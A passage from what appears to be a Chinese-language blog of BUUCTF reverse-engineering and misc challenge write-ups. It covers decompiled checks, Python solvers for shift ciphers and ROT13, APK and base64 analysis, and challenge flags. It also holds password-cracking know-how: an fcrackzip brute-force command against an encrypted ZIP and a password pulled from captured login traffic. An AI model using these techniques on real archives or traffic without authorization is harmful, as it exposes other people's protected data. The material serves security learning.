class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )<span class="comment">//大写字母处理</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )<span class="comment">//小写字母处理</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>第一个while循环<br>65-90的数，第二个循环是97-122的数，对大小写字母分别加密<br>第二个while循环是比较</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;ACTF&#x27;</span></span><br><span class="line">v12=<span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v12)):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        i=s</span><br><span class="line">        <span class="keyword">if</span> (i&gt;<span class="number">64</span> <span class="keyword">and</span> i&lt;=<span class="number">90</span>):</span><br><span class="line">            i = (i-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">96</span> <span class="keyword">and</span> i&lt;=<span class="number">122</span>):</span><br><span class="line">            i = (i-<span class="number">79</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> i ==<span class="built_in">ord</span>(v12[k]):<span class="comment">#第二个循环的比较</span></span><br><span class="line">            a = a+<span class="built_in">chr</span>(s)</span><br><span class="line"><span class="built_in">print</span>(a+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>跑出来的脚本再包上flag<br>###flag{Cae3ar_th4_Gre@t}</p><h2 id="CrackRTF-1"><a href="#CrackRTF-1" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>看了writeup知道这道题是与winapi有关的题目，两个加密检验的部分</p><blockquote><p>strcat()函数是字符串的拼接</p></blockquote><p>进入主函数开始分析<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661702071873-ab533a64-eddd-44c4-8904-60524fcf2f6e.png"                      alt="image.png"                ><br>先分析第一段，输入字符Destination，判断长度是否是6，感觉没啥，继续往下读，往下读发现读不通了，全是粉色的函数<br>点进sub_40100A函数中会发现更多的粉色函数，直接上网搜每一个函数大概是什么意思<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661758098300-4e6bc0fe-b10f-49ea-8194-6f86053d1a70.png"                      alt="image.png"                ></p><blockquote><p>CryptAcquireContextA：连接CSP，获得指定CSP的密钥容器的句柄<br>CryptCreateHash：启动数据流的散列。它创建并向调用应用程序返回加密服务提供程序 (CSP) 哈希对象的句柄。此句柄用于后续调用 CryptHashData 和 CryptHashSessionKey 以散列会话密钥和其他数据流。<br>CryptHashData：将数据添加到指定的哈希对象。可以多次调用此函数和 CryptHashSessionKey 来计算长数据流或不连续数据流的哈希值。<br>CryptGetHashParam：检索控制散列对象操作的数据。可以使用此函数检索实际散列值。<br>wsprintfA：将一系列的字符和数值输入到缓冲区。输出缓冲区里的的值取决于格式说明符（即”%”）。<br>lstrcatA：该函数将字符串lpString2附加在另一个字符串lpString1后面。<br>CryptDestroyHash：销毁由 hHash 参数引用的哈希对象。散列对象被销毁后，就不能再使用了。<br>CryptReleaseContext：释放加密服务提供程序 (CSP) 和密钥容器的句柄。</p></blockquote><p>后面将Destination和”@DBApp”,v3赋值为Destination的长度，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661702243369-25108d63-83b0-4459-9e61-23b61c8f2cb7.png"                      alt="1661702238317.png"                ></p><h2 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h2><h3 id="M1–读代码解密"><a href="#M1–读代码解密" class="headerlink" title="M1–读代码解密"></a>M1–读代码解密</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661860855486-768ab726-79f5-4b33-a66d-56e22d7c4f66.png"                      alt="image.png"                ><br>下载好了之后是这样的两个文件，<br>打开Description.txt文本文件给了flag的格式是以邮箱的形式<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1662214046748-180f4c6d-4904-48f0-a936-a06d4f498dc0.png"                      alt="image.png"                ><br>打开login.html文件可以发现下面的源代码里有加密的代码逻辑如下</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;prompt&quot;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(</span><br><span class="line">        <span class="regexp">/[a-zA-Z]/g</span>, </span><br><span class="line">    <span class="keyword">function</span>(<span class="params">c</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure></div><p>看到一条关键信息的加密<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);</code><br>看上去是一个超级三目运算，输入的c经过加密后输出<br>这样看的话很烦看着，所以直接设未知字符串<br><code>enc1=(c &lt;= &quot;Z&quot; ? 90 : 122)</code>判断输入的字符是大写还是小写，并且对应着’z’的ascii’码<br><code>enc2=(c = c.charCodeAt(0) + 13)</code>将当前的字符的第一个字符的ASCII值+13再赋给enc2</p><blockquote><p>js的charCode()方法<br>返回字符串第一个字符的 Unicode 编码(H 的 Unicode 值):<br>e.g:<br><code>var str = &quot;HELLO WORLD&quot;; var n = str.charCodeAt(0); </code><br>输出结果：72<br>tips:<br>Unicode编码与Ascii编码之间的区别是一个是2个字节一个1个字节，统一为Unicode编码是为了不出现乱码的情况</p></blockquote><p>最后的三目运算就是<code>enc1&gt;=enc2?enc2:enc-26</code>最后加完的值大于等于当前的”Z”,如果是执行enc2，即是+13后的结果，如果不是的话就是-26，反过来用flag的字符就是-13后小于当前字符对应的A时，就+26，否则就-13，写脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc: <span class="comment">#字符串的遍历 range(enc)是数组的遍历</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(i)&gt;=<span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">65</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(i)&gt;=<span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">97</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag +=i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><h3 id="M2–ROT13的利用"><a href="#M2–ROT13的利用" class="headerlink" title="M2–ROT13的利用"></a>M2–ROT13的利用</h3><p>没想啊，竟然是ROT13的加密<br>一个是+13一个是-26就是正巧是<strong>ROT-13。</strong><br>只受26个字母的影响，数字、符号、空白以及其他的所有字元都不变（ 英文字母的字符换成它13位之后的字符，越界之后再折回来）。<br>直接将获得的密文进行ROT13解码就行了,ASCII对照表可以方便数清字母之间相差的位数<br>ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>NOPQRSTUVWXYZABCDEFGHIJKLM<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1662209789496-017a0694-4c4d-40e2-aa32-bfbe789258a8.png"                      alt="ascii-1-1.png"                ></p><p>flag{<a class="link"   href="mailto:&#x43;&#x6c;&#105;&#x65;&#110;&#x74;&#83;&#105;&#x64;&#101;&#76;&#111;&#103;&#x69;&#110;&#115;&#65;&#114;&#x65;&#69;&#97;&#x73;&#x79;&#x40;&#102;&#108;&#97;&#x72;&#x65;&#45;&#x6f;&#x6e;&#46;&#99;&#x6f;&#x6d;" >&#x43;&#x6c;&#105;&#x65;&#110;&#x74;&#83;&#105;&#x64;&#101;&#76;&#111;&#103;&#x69;&#110;&#115;&#65;&#114;&#x65;&#69;&#97;&#x73;&#x79;&#x40;&#102;&#108;&#97;&#x72;&#x65;&#45;&#x6f;&#x6e;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>}</p><h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>查看字符串，点进提示字符所在的函数之后发现在主函数的伪代码<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1662551734909-cedba906-28e7-4bc1-b45e-1b02cf1b6396.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1662214748813-9558d804-6a29-44fb-8e1d-47fe58b6c37a.png"                      alt="image.png"                ><br>经过大佬的讲解貌似是经过十次base64的加密，最后与后面的字符进行比较，比较成功就会显示”<code>You found me!!!</code>“</p><blockquote><p>b64decode()<br>将二进制字符串解码为正常形式</p></blockquote><h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>下载后发现是被upx加壳的文件，直接脱壳，而且是32位的，直接放在ida里进行分析<br>分析主函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661945312814-078d0bf8-107e-4e8a-9a54-00c4b0c0eac7.png"                      alt="image.png"                ></p><h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><p>下载后是一个apk文件，放在模拟器里面发现打不开文件，所以直接使用GDA打开apk分析文件<br>查看所有字符后猜测是base64加密的，查看C2之后发现用到了NativeMethod方法，再进行base64的解密<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661938137722-6dd547ee-bb01-431d-9ee3-af3399ee8616.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661916238615-0f1592b7-7827-44c3-9149-01fcc7dbbadb.png"                      alt="image.png"                ></p><blockquote><h3 id="Native-Method"><a href="#Native-Method" class="headerlink" title="Native Method"></a>Native Method</h3><p>是一个java调用非java代码的接口，是由非java语言实现的。<br>我们可以在一个native method的本地实现中访问所有的java特性，但是这要依赖于你所访问的java特性的实现，而且这样做远远不如在java语言中使用那些特性方便和容易。<br>native method的存在并不会对其他类调用这些本地方法产生任何影响，实际上调用这些方法的其他类甚至不知道它所调用的是一个本地方法  </p></blockquote><p>找到.so文件右键导出（找了半天才找到怎么操作这个东西）<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661937744017-b5c2e985-0e5c-45c6-b5aa-3dbf1b6fc20a.png"                      alt="image.png"                ><br>将.so文件放在ida32位里面进行分析，发现有三串感觉像是base64加密后的密文，直接用在线转换的工具转换。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661937354194-28a9c728-d5b2-454c-8984-da89b413014a.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661935336377-a0a88e90-58e5-40ba-b62e-beea3ebae138.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661935357167-28c70bd1-237d-4902-b904-8f9a78d69caa.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1661935299862-de74f8ff-ad7f-470b-8015-2cc2bfb68fa9.png"                      alt="image.png"                ><br>后面按照题目的意思flag是一个邮箱，所以flag应该是<a class="link"   href="mailto:&#49;&#x38;&#50;&#x31;&#x38;&#x34;&#x36;&#53;&#49;&#x32;&#53;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#109;" >&#49;&#x38;&#50;&#x31;&#x38;&#x34;&#x36;&#53;&#49;&#x32;&#53;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，包上flag{}就正确了<br>###flag{<a class="link"   href="mailto:&#x31;&#56;&#50;&#x31;&#x38;&#x34;&#x36;&#x35;&#x31;&#50;&#x35;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;" >&#x31;&#56;&#50;&#x31;&#x38;&#x34;&#x36;&#x35;&#x31;&#50;&#x35;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>}</p><h1 id="BUUCTF平台MISC刷题20221217"><a href="#BUUCTF平台MISC刷题20221217" class="headerlink" title="BUUCTF平台MISC刷题20221217"></a>BUUCTF平台MISC刷题20221217</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660317261295-a9d084db-52c6-4799-873d-ec1c4fc09fb9.png"                      alt="QR_code.png"                ><br>下载后是一张照片，二维码的图片，直接用软件破解后填入是错的<br>直接将图片放入到010editor进行分析，发现这个图片里包含着压缩包，kali中的binwalk进行分离<br><code>binwalk -e xx.png</code><br>分离出压缩包且是加密的，使用爆破命令<br><code>fcrackzip -b -c 1 -l 4-4 -u /home/kali/Desktop/1D7.zip</code> 4-4是由于文件打开后的文本文件写的是4位数的密码所以是4，得到解压密码是7639 解压出来密码得到了flag文件<br>##flag{vjpw_wnoei}</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>下载后的文件执行不了，直接拖入010editor中进行分析<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660552763755-898f4d53-8e93-4968-bca1-dfde31bd9728.png"                      alt="图片.png"                >根据开头的data:image&#x2F;jpg;base64知道应该是将base64的编码转换成照片<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660553049791-5d364ec4-9696-4f26-8980-3f8a0b3c14f2.png"                      alt="图片.png"                >二维码扫描工具<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660553106148-2687340c-3cba-43ba-b364-38d7332f3472.png"                      alt="图片.png"                ><br>将KEY换成flag就好了<br>##flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660557922955-7a5e5c91-3abb-4717-8db8-b56f15d6f07c.png"                      alt="图片.png"                ><br>显示屏幕太小，所以大概是长宽被改变了。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660558027105-1829bbce-c9cf-4cea-a376-9ca142232f71.png"                      alt="图片.png"                >放入010之后也报了CRC错误，改变图片的高度与宽度相同 02 A7，得到flag<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660558348423-4c023006-31a9-46b4-ae9c-d22ed8ad89fa.png"                      alt="image.png"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660558290673-81d4be09-ff39-4758-9569-38a57dcb7ff4.png"                      alt="图片.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660558263592-227951cc-b1b1-48d4-8f1f-54cfa66bea5a.png"                      alt="图片.png"                >###flag{He1l0_d4_ba1}</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>根据题目的提示<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660554925033-7f3d9ed9-2386-48dc-96be-e83f90f1a97d.png"                      alt="图片.png"                ><br>登录后的流量包是POST的，只有这一条是符合条件的<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660554967415-ba6d10fb-6577-4536-a963-b66d14676d2c.png"                      alt="图片.png"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660554993745-b72a5036-0af1-43b0-9fd3-34aa4654e43c.png"                      alt="图片.png"                >找到管理员的密码得到flag<br>###flag{ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha}</p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660555141806-aeb289a2-9358-4c6b-899d-37e306592fe6.png"                      alt="图片.png"                ><br>下载后是一个压缩包，直接进行密码的爆破，4位纯数字，设置好后等待，接触的密码是8795，打开加密的压缩文件得到flag<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660555350775-76c965fd-9f1e-4c10-858b-6664943535d9.png"                      alt="图片.png"                ><br>###flag{1773c5da790bd3caff38e3decd180eb7}</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>下载得到加密的压缩包，如果像上面的题目的话，我们是得不到密码的<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660555547966-edff6b98-ca32-469c-872d-1479aade21b9.png"                      alt="图片.png"                ><br>放入010editor看看<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660556172388-ac6b23d2-457c-4087-8955-976a8eda8a73.png"                      alt="图片.png"                >这里需要补充知识点<br>文件的头文件类型<br>一个 ZIP 文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br>1、压缩源文件数据区<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660556206833-2abb5daa-bc47-4de7-b87d-6184172fe349.png"                      alt="image.png"                ><br>在这个数据区中每一个压缩的源文件&#x2F;目录都是一条记录，记录的格式如下：[文件头+ 文件数据 + 数据描述符]<br>a 文件头格式<br>组成    　                长度</p><hr><p>文件头标记4 bytes  (0x04034b50)<br>解压文件所需 pkware 版本2 bytes<br>全局方式位标记2 bytes<br>压缩方式2 bytes<br>最后修改文件时间2 bytes<br>最后修改文件日期2 bytes<br>CRC-32校验4 bytes<br>压缩后尺寸4 bytes<br>未压缩尺寸4 bytes<br>文件名长度2 bytes<br>扩展记录长度2 bytes<br>文件名（不定长度）<br>扩展字段（不定长度）<br>b、文件数据<br>c、数据描述符<br> 　　组成    　     长度</p><hr><p>CRC-32校验                  4 bytes<br>  　　压缩后尺寸                   4 bytes<br> 　 　未压缩尺寸                   4 bytes<br>这个数据描述符只在全局方式位标记的第３位设为１时才存在（见后详解），紧接在压缩数据的最后一个字节后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p><pre><code> 2、压缩源文件目录区</code></pre><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1660556611682-e0511f08-1d12-4e17-848f-c4bf68c22139.png"                      alt="image.png"                >在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据<br>组成               　            长度</p><hr><pre><code>　　目录中文件文件头标记             4 bytes  (0x02014b50)　　压缩使用的　pkware 版本          2 bytes　　解压文件所需 pkware 版本         2 bytes全局方式位标记                   2 bytes　　压缩方式                        2 bytes　　最后修改文件时间                2 bytes　　最后修改文件日期                 2 bytes　　ＣＲＣ－３２校验                 4 bytes　　压缩后尺寸                      4 bytes　　未压缩尺寸                      4 bytes　　文件名长度                      2 bytes　　扩展字段长度                    2 bytes　　